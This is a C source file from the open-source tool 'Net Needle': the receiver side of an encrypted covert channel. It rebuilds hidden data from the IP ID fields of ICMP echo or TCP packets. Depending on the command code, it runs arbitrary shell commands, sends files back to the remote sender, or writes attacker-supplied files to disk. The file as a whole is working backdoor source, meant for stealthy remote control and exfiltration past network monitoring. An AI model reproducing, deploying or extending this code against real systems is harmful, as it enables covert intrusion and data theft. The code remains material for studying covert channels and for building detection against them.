/*

Copyright (C) 2016 John Ventura

This file is part of Net Needle.

NetNeedle is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

NetNeedle is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with Net Needle. If not, see http://www.gnu.org/licenses/.

*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>		// needed for display
#include <string.h>
#include <fcntl.h>
#include <time.h>		// needed for packet timeout
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>		// needed for stat
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include "block.h"
#include "global.h"
#include "shell.h"

#define BUFLEN 1024
#define INPUTBUFLEN 0x10000
#define DEFAULTINIT 0x01

int sendpingid(uint32_t s_ip, uint32_t d_ip, uint8_t * buf, int buflen);
int makeblock(uint8_t code, uint8_t * data, int len);
int decrypt(uint8_t * ciphertext, int ciphertext_len, uint8_t * pk,
	    uint8_t * sk, uint8_t * nonce, uint8_t * plaintext);
uint32_t getrandom32();
void updatenonce();

char *runcommand(char *cmdstr, int sendoutput)
{
	char *errormsg = "ERROR";
	char *outbuf;
	int buffersize;
	int blocknumber;
	int outputsize;
	int outputtotal = 0;

	FILE *cd;

	buffersize = BLOCKSIZE;
	outbuf = (char *)malloc(buffersize);
	if (outbuf == NULL) {
		perror("can't allocate memory");
		exit(1);
	}

	cd = popen(cmdstr, "r");
	blocknumber = 0;
	while ((outputsize =
		fread(outbuf + (blocknumber * BLOCKSIZE), 1, BLOCKSIZE, cd))) {
		buffersize += BLOCKSIZE;
		outbuf = realloc(outbuf, buffersize);
		if (outbuf == NULL) {
			perror("can't allocate memory");
			exit(1);
		}
		blocknumber++;
		outputtotal += outputsize;
	}
	if (pclose(cd) == 0x7f00) {
		outputtotal = strlen(errormsg);
		memcpy(outbuf, errormsg, outputtotal);
	}
	if (sendoutput) {
		makeblock(CODERESPONSE, (uint8_t *) outbuf, outputtotal);
	}
	free(outbuf);
	return (0);
}

int sendfile(char *filename)
{
	struct stat sd;
	int fd;
	uint8_t *filebuf;

	fd = open(filename, O_RDONLY);
	if (fd < 0) {
		makeblock(CODEERROR, (uint8_t *) "\x00\x00\x00\x00", 4);
		return (0);
	}
	if (fstat(fd, &sd) == 0) {
		filebuf = (uint8_t *) malloc(sd.st_size);
		if (filebuf == NULL) {
			perror("can't allocate memory");
			exit(1);
		}
		if (read(fd, filebuf, sd.st_size) > 0) {
			makeblock(CODERESPONSE, filebuf, sd.st_size);
		}
		free(filebuf);

	} else {
		makeblock(CODEERROR, (uint8_t *) "\x00\x00\x00\x00", 4);
	}
	return (0);
}

uint32_t countblocks(uint32_t datasize)
{
	uint32_t payloadsize;
	uint32_t numberofblocks;

	payloadsize = BLOCKSIZE - sizeof(struct blockhdr);

	numberofblocks = (datasize / payloadsize);
	if (datasize % payloadsize) {
		numberofblocks++;
	}
	return (numberofblocks);

}

uint8_t *extractblockdata(uint8_t * blocks, uint32_t size)
{
	int i;
	uint8_t *rbuf;

	rbuf = (uint8_t *) malloc(BLOCKSIZE * countblocks(size));
	if (rbuf == NULL) {
		perror("can't allocate memory");
		exit(1);
	}

	for (i = 0; i < countblocks(size); i++) {
		memcpy(rbuf + (i * (BLOCKSIZE - sizeof(struct blockhdr))),
		       blocks + (i * BLOCKSIZE) + sizeof(struct blockhdr),
		       BLOCKSIZE - sizeof(struct blockhdr));
	}

	return (rbuf);
}

// this loop processes all incoming data
// it tries to decrypt it, and if it's successful, it tries to
// use the data in a way that is specified by the cmd code

int receivedata(int mode)
{
	int sock;
	int packetlen;
	uint8_t payload;
	uint8_t *packet;
	uint8_t *inbuf;
	uint8_t *plaintextblockdata;
	uint8_t *plaintext;
	uint8_t *fakenonce;
	uint8_t *cmdoutput;
	uint8_t *blockdata;
	int dataoffset;
	int dataexpected = 0x7fffffff;
	unsigned int payloadsize;
	unsigned int howmuchdata = 0;
	uint16_t currentblock = 0;
	uint32_t s_ip = 0x00000000;
	uint32_t d_ip = 0x00000000;
	struct icmphdr *icmp;
	struct iphdr *ip;
	struct tcphdr *tcp;
	struct blockhdr *firstblock;
	int filenamelen;
	int one = 1;
	int superblock = 0;
	int sendoutput;
	int cmdcode;
	int processpacket = 0;
	int marker = DEFAULTINIT;
	int i;
	struct timeval tv;
	time_t lastpackettime;
	time_t thispackettime;
	FILE *fd;

	sock = socket(AF_INET, SOCK_RAW, receivemode);
	if (sock < 0) {
		perror("can't open listening socket");
		exit(1);
	}
	if (mode != CMDRECEIVE) {
		tv.tv_sec = 2;	//timeout while waiting for echo responses
		tv.tv_usec = 0;
		setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv,
			   sizeof(struct timeval));
	}

	inbuf = (uint8_t *) malloc(INPUTBUFLEN);
	if (inbuf == NULL) {
		perror("can't allocate memory");
		exit(1);
	}

	plaintext = (uint8_t *) malloc(INPUTBUFLEN);
	if (plaintext == NULL) {
		perror("can't allocate memory");
		exit(1);
	}
	plaintextblockdata = (uint8_t *) malloc(INPUTBUFLEN);
	if (plaintextblockdata == NULL) {
		perror("can't allocate memory");
		exit(1);
	}

	fakenonce = (uint8_t *) malloc(crypto_box_NONCEBYTES);
	if (fakenonce == NULL) {
		perror("can't allocate memory");
		exit(1);
	}
	memset(fakenonce, 0x00, crypto_box_NONCEBYTES);

	packet = (uint8_t *) malloc(BUFLEN);
	if (packet == NULL) {
		perror("can't allocate memory");
		exit(1);
	}
	ip = (struct iphdr *)packet;
	icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
	tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

	payloadsize = BLOCKSIZE - sizeof(struct blockhdr);

	dataoffset = 0;
	lastpackettime = 0;
	for (packetlen = 0; packetlen >= 0;
	     packetlen = read(sock, packet, BUFLEN)) {
		time(&thispackettime);

		ip->id &= ntohs(0x00ff);	// we only care about the lower 8 bits
		processpacket = 0;
		if ((icmp->type == ICMP_ECHO) && (ip->saddr != localip)	// this is the packet filter. BPF is less portable
		    && receivemode == IPPROTO_ICMP) {
			processpacket = 1;
		} else if ((ip->saddr != localip)
			   && (tcp->th_flags == (TH_PUSH | TH_ACK))
			   && (receivemode == IPPROTO_TCP)) {
			processpacket = 1;
		}
		if ((icmp->un.echo.sequence == ntohs(0x01)
		     && (receivemode == IPPROTO_ICMP))
		    || ((receivemode == IPPROTO_TCP) && (tcp->th_flags == TH_SYN))) {	// recognize a new transmission
			if (((thispackettime - lastpackettime) > 60)
			    || (receivemode != IPPROTO_ICMP)) {
				remoteip = s_ip = ip->saddr;
				localip = d_ip = ip->daddr;
				currentblock = 0;
				howmuchdata = 0;
				superblock = 0;
				dataexpected = 0x7fffffff;
				memset(plaintext, 0x00, BLOCKSIZE);
			}
			if (receivemode == IPPROTO_TCP) {
				marker = tcp->seq;
			} else {
				marker = DEFAULTINIT;
			}
		}

		if (processpacket == 1) {
			lastpackettime = thispackettime;
			if (packetlen != 0 && s_ip == ip->saddr) {
				if (receivemode == IPPROTO_ICMP) {
					dataoffset =
					    ((0x10000) * superblock) +
					    (ntohs(icmp->un.echo.sequence) -
					     marker);
					if (ntohs(icmp->un.echo.sequence) ==
					    (0xffff)) {
						superblock++;
					}
				} else if (receivemode == IPPROTO_TCP) {
					dataoffset =
					    ntohl(tcp->seq) - (ntohl(marker) +
							       1);
				}
				payload = ntohs(ip->id);
				inbuf[dataoffset] = payload;
				if (dataoffset == (SIGNEDBLOCKSIZE - 1)) {	//we know we have a block when we hit the blocksize
					if (howmuchdata == 0) {	// if we haven't read data before, it's the first block
						memset(plaintext, 0x00,
						       BLOCKSIZE);
						if (decrypt
						    (inbuf, SIGNEDBLOCKSIZE,
						     pk_theirs, sk_mine, nonce,
						     plaintext) == 0) {
							if (decrypt
							    (inbuf,
							     SIGNEDBLOCKSIZE,
							     pk_theirs, sk_mine,
							     fakenonce,
							     plaintext) > 0) {
								firstblock =
								    (struct
								     blockhdr *)
								    plaintext;
								if (firstblock->
								    code !=
								    CODETOKEN) {
									// if null nonce works, and its not a token request, delete data
									memset
									    (plaintext,
									     0x00,
									     BLOCKSIZE);
								}
							} else {
								dataoffset = 0;
							}
						}
						firstblock =
						    (struct blockhdr *)
						    plaintext;

						dataexpected =
						    SIGNEDBLOCKSIZE *
						    countblocks(ntohl
								(firstblock->
								 size));
						if (dataexpected > INPUTBUFLEN) {	// make inbuf bigger or smaller
							inbuf =
							    realloc(inbuf,
								    dataexpected);
							if (inbuf == NULL) {
								perror
								    ("can't allocate memory\n");
								exit(1);
							}
							plaintextblockdata =
							    (uint8_t *)
							    realloc
							    (plaintextblockdata,
							     (SIGNEDBLOCKSIZE *
							      countblocks(ntohl
									  (firstblock->
									   size))
							      + 32));
							if (plaintextblockdata
							    == NULL) {
								perror
								    ("can't allocate memory");
								exit(1);
							}
						}
					}

					howmuchdata =
					    (currentblock + 1) * payloadsize;

				}	// this is where the first block data acquisition ends 
				if (dataoffset >= (dataexpected - 1) && (firstblock->size != 0)) {	// this is what we do when we get all the data we expect
					for (i = 0;
					     i <
					     countblocks(ntohl
							 (firstblock->size));
					     i++) {
						decrypt(inbuf +
							(i * SIGNEDBLOCKSIZE),
							SIGNEDBLOCKSIZE,
							pk_theirs, sk_mine,
							nonce,
							plaintextblockdata +
							(i * BLOCKSIZE));
					}
					lastpackettime = 0;	// reset the time so that datagrams do not run together

					// commands codes are specified by the client
					// last 4 bits of this field tell the server what kind of block it got
					// hightest bit tells the server whether or not client wants output
					cmdcode = (firstblock->code & 0x0f);
					sendoutput =
					    ~(firstblock->code & 0x80) << 7;

					switch (mode) {
					case CMDRECEIVE:
						if ((cmdcode) == CODEEXEC) {
							blockdata =
							    extractblockdata
							    (plaintextblockdata,
							     ntohl(firstblock->
								   size));
							if ((sendoutput)
							    && (silent != 1)) {
								cmdoutput =
								    (uint8_t *)
								    runcommand((char *)
									       blockdata, 1);
							} else {
								cmdoutput =
								    (uint8_t *)
								    runcommand((char *)
									       blockdata, 0);
							}
							free(cmdoutput);
							free(blockdata);
							updatenonce();
						}
						if ((cmdcode) == CODECHAT) {
							blockdata =
							    extractblockdata
							    (plaintextblockdata,
							     ntohl(firstblock->
								   size));
							printf("%s\n",
							       blockdata);
							free(blockdata);
						}
						if ((cmdcode) == CODETOKEN) {
							randombytes(fakenonce, crypto_box_NONCEBYTES);	// make a random nonce
							memset(nonce, 0x00, crypto_box_NONCEBYTES);	// sent real nonce to 0x00 so client can understand it

							usleep(5000);	// timeout to give client time to switch into receive mode
							makeblock(CODERESPONSE, (uint8_t *) fakenonce, crypto_box_NONCEBYTES);	// send them the new nonce
							memcpy(nonce, fakenonce, crypto_box_NONCEBYTES);	// set the real nonce 
							memset(fakenonce, 0x00, crypto_box_NONCEBYTES);	// null out the fake nonce
						}
						if ((cmdcode) == CODEGET) {
							cmdoutput =
							    extractblockdata
							    (plaintextblockdata,
							     ntohl(firstblock->
								   size));
							sendfile((char *)
								 cmdoutput);
							free(cmdoutput);
						}
						if ((cmdcode == CODEPUT)) {
							cmdoutput =
							    extractblockdata
							    (plaintextblockdata,
							     ntohl(firstblock->
								   size));
							filenamelen =
							    strlen((char *)
								   cmdoutput) +
							    1;
							if (filenamelen & one) {
								filenamelen++;
							}
							// make sure the block isn't telling us to read past the buffer
							if (filenamelen < ntohl(firstblock->size)) {	// process file stuff here
								fd = fopen((char
									    *)
									   cmdoutput,
									   "w+");
								if (fd != NULL) {
									fwrite
									    (cmdoutput
									     +
									     filenamelen,
									     ntohl
									     (firstblock->
									      size)
									     -
									     filenamelen,
									     1,
									     fd);
									fclose
									    (fd);
								}
							}

							free(cmdoutput);
						}
						break;
					case CMDEXEC:
						cmdoutput =
						    extractblockdata
						    (plaintextblockdata,
						     ntohl(firstblock->size));
						fwrite(cmdoutput,
						       ntohl(firstblock->size),
						       1, stdout);
						free(cmdoutput);
						free(packet);
						return (0);
						break;
					case CMDTOKEN:
						cmdoutput =
						    extractblockdata
						    (plaintextblockdata,
						     ntohl(firstblock->size));
						memcpy(nonce, cmdoutput,
						       crypto_box_NONCEBYTES);
						free(cmdoutput);
						free(packet);
						return (0);
						break;
					case CMDPUT:
						break;
					case CMDGET:
						cmdoutput =
						    extractblockdata
						    (plaintextblockdata,
						     ntohl(firstblock->size));
						if (firstblock->code ==
						    CODEERROR) {
							printf
							    ("File not available\n");
						} else {
							fd = fopen(getfilename,
								   "w+");
							if (fd == NULL) {
								printf
								    ("can't open %s for writing\n",
								     getfilename);
							} else {
								fwrite
								    (cmdoutput,
								     ntohl
								     (firstblock->
								      size), 1,
								     fd);
								fclose(fd);
							}

							free(packet);
							free(cmdoutput);
						}
						return (0);
						break;
					case CMDCHAT:
						break;
					default:
						break;
					}	// do something with the data, depending on mode ends here (case statement)

				}	// what to do when we get the data loop ends here
				currentblock++;
			}	// internal packet process loop ends here
		}		// packet process loop ends here
	}			// packet read loop ends here

	close(sock);
	return (0);
}

int cmdreceive(char *args)
{
	if (args == NULL) {
		receivedata(CMDRECEIVE);
	}
	if (!strncasecmp(args, "tcp", 3)) {
		receivemode = IPPROTO_TCP;
		printf("Listening in TCP mode\n");
	}
	if (!strncasecmp(args, "icmp", 4)) {
		receivemode = IPPROTO_ICMP;
		printf("Listening in ICMP mode\n");
	}
	return (0);
}
